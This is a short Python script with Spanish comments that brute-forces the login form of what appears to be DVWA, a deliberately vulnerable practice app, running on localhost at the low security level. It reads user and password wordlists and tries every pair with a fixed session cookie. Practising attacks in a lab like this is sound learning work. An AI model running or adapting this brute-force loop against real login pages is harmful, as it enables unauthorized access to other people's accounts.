import requests

# URL del formulario de login
url = "http://localhost:8080/vulnerabilities/brute/"

# Lista de usuarios y contraseñas
user_file = "C:/Users/nicol/Downloads/users.txt"
pass_file = "C:/Users/nicol/Downloads/claves.txt"

# Leer lista de usuarios y contraseñas
with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
    users = [line.strip() for line in uf]
    passwords = [line.strip() for line in pf]

# Encabezados HTTP para mantener la sesión y simular un navegador
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Cookie": "PHPSESSID=0dvl9td5iv04jrskpgs2o2hql0; security=low",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Realizar el ataque de fuerza bruta usando GET
for user in users:
    for password in passwords:
        # Construir la URL con los parámetros de login
        params = {"username": user, "password": password, "Login": "Login"}
        response = requests.get(url, headers=headers, params=params)

        # Imprime todo el contenido para verificar qué se está devolviendo


        # Verificar si el mensaje de error no está presente
        if 'Username and/or password incorrect.' not in response.text:
            print(f"Login exitoso: Usuario: {user} / Contraseña: {password}")
            break  # Detener después del primer login exitoso
